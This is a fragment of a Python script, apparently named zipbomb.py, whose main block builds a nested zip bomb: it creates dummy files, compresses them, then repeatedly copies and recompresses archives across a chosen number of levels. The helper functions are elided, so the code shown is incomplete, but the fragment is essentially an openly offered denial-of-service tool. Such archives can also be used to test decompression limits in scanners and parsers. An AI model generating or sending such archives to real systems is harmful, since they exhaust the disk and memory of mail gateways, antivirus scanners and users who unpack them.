...
if __name__ == '__main__':
	if len(sys.argv) < 4:
		print ('Usage:\n')
		print (' zipbomb.py n_levels num_files out_zip_file')
		exit()
	...
	for i in range(0,num_files) :
		dummy_name = 'dummy'+str(i)+'.txt'
		start_time = time.time()
		generate_dummy_file(dummy_name, 1)
		dummy_list.append(dummy_name)
	level_1_zip = '1.zip'
	compress_file(dummy_list, level_1_zip)
	for i in range(0, num_files):
		os.remove(dummy_list[i])
	for i in range(1, n_levels+1):
		make_copies_and_compress('%d.zip' % i, '%d.zip' % (i+1), 1)
		os.remove('%d.zip' % i)
